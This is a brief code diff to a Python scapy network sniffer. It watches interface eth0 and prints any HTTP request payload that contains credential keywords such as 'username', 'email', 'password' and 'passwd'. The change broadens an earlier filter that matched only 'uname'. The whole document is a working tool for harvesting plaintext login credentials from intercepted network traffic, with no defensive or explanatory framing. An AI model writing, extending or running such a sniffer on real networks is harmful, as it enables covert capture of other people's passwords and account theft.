@@ -12,10 +12,13 @@ def sniffer(interface):
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         if packet.haslayer(scapy.Raw):
-            # print(packet[scapy.Raw].load)
-            load = packet[scapy.Raw].load
-            if b'uname' in load:
-                print(load)
+            load_as_str = str(packet[scapy.Raw].load)
+            keywords = ['username', 'uname', 'login',
+                        'email', 'password', 'passwd', 'pass']
+            for keyword in keywords:
+                if keyword in load_as_str:
+                    print(load_as_str)
+                    break
 
 
 sniffer('eth0')
